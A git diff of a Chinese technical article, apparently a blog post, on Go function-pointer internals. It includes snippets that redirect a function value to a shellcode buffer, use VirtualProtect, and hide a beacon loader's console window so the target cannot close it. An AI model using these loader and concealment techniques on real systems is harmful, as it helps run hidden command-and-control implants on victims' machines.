@@ -275,7 +275,7 @@ println(oldperm)
 info.entry = (uintptr)(unsafe.Pointer(&buf[0]))
 ```
 
-但修改后并不能覆盖f，因为它并不是实际的first-class对象，而只是runtime用来记录函数元信息的结构
+但修改后并不能覆盖f，因为`_func`并不是实际的first-class对象，而只是runtime用来记录函数元信息的结构
 
 #### Go中的first-class函数对象是一个双重指针
 
@@ -305,9 +305,9 @@ off_4DA690      dq offset reflect_cvtFloatInt
 off_4DA698      dq offset reflect_cvtFloatUint
 ```
 
-Go中的first-class function是一个双重指针，而直接`func xx() {}`定义的函数则直接指向入口地址（和C/Cpp中一样）
+**通过查看内存结构，Go中的first-class function是一个双重指针，解引两次后到达函数入口（也就是相比C/Cpp的函数指针需要多一次解引）；直接`func x() {}`定义的函数不可取址，且不在PC table中存储入口地址，它实际就代表了函数自身**
 
-比如下面的例子，你应该能通过IDA里看到表中有main_main_func1，main_X
+比如下面的例子，你应该能通过IDA里看到表中有`main_main_func1`，`main_X`，而表内没有`main_Y`（与内联与否无关）
 
 ```go
 func X() {}
@@ -320,15 +320,12 @@ func main() {
 }
 ```
 
-但直接定义的函数是不可寻址的，如果你硬要取它的地址，只能通过反射
+直接定义的函数是不可寻址的，如果硬要取它的地址，只能通过反射
 
 ```go
 func X() {}
 
-func Y() {}
-
 func main() {
-    Z := func() {}
     x := X
     println(*(*uintptr)(unsafe.Pointer(&x)))
     println(**(**uintptr)(unsafe.Pointer(&x)))
@@ -344,7 +341,7 @@ OUTPUT
 */
 ```
 
-可以看到X的地址就是机器码中函数的入口地址，而first-class对象的地址则是PC table中对应offset的地址
+可以看到X的地址就是机器码中函数的入口地址，而first-class的函数对象则是一个指向PC table中函数入口地址的指针
 
 IDA里看一下，把`&f`识别为了三重指针`void(***f)()`
 
@@ -370,7 +367,7 @@ var ptr uintptr = (uintptr)(unsafe.Pointer(&buf[0]))
 *(*uintptr)(unsafe.Pointer(&f)) = (uintptr)(unsafe.Pointer(&ptr))
 ```
 
-上面的做法是修改第一层指针也就是`f`本身，当然也可以修改第二层指针也就是`f`指向的函数真实入口地址，但因为第二层指针是READONLY权限，不同于`f`的READWRITE，所以还需要调用VirtualProtect修改指针的权限
+上面的做法是修改第一层指针也就是`f`本身，当然也可以修改第二层指针也就是`f`指向的函数真实入口地址，但因为第二层指针是READONLY权限，不同于`f`的READWRITE，直接运行会crash，所以还需要调用VirtualProtect修改指针的权限
 
 ```go
 virtualProtect.Call(
@@ -393,9 +390,9 @@ virtualProtect.Call(
 
 ***
 
-加载生成的shellcode二进制打开后就是一个黑窗，可能还没来得及migrate对方就关闭了。
+加载生成的shellcode二进制打开后就是一个黑窗，可能还没来得及migrate process对方就关闭了。
 
 解决的办法
 
 + 在`initial_beacon`中设置auto migrate，但还得连带把initial sleep设置成尽可能短
-+ 添加编译选项，打开直接后台执行，不显示黑窗`-ldflags="-H windowsgui"`
++ 添加编译选项，打开直接后台执行：`-ldflags="-H windowsgui"`
